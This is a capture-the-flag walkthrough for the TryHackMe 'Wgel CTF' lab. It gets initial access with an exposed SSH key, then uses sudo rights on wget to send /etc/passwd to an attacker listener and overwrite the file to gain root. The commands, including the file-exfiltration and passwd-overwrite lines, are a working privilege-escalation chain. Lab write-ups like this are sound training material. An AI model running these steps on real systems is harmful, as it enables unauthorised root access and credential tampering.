# Wgel CTF

[Wgel CTF](https://tryhackme.com/room/wgelctf)

## Solution

### Enumeration

- nmap scan: 22, 80
- feroxbuster scan: /sitemap/.ssh/id_rsa
- apache server: we find a comment in the html of the front page `<!-- Jessie don't forget to udate the webiste -->`

### Jessie

Download the key and connect to the target machine as jessie.

```console
wget http://$IP/sitemap/.ssh/id_rsa -O id_rsa
chmod 600 id_rsa
ssh -i id_rsa jessie@$IP
```

### wget

Jessie can run wget as root without a password. We can check that with `sudo
-l`.

On the host `nc -lvnp 6969 > passwd`
On the target `sudo wget --post-file=/etc/passwd <your ip>:6969`

Now we can change the x from the root entry to `U6aMy0wojraho` which basically
allows you to switch to that user whitout the need of a password. This is how a
guest account would work
https://askubuntu.com/questions/14222/how-to-add-a-guest-account-without-a-password

On the host `python -m http.server`
On the target `sudo wget <your_ip>:8000/passwd -O /etc/passwd`

Now you can run `su root` and use the empty password to login as root.
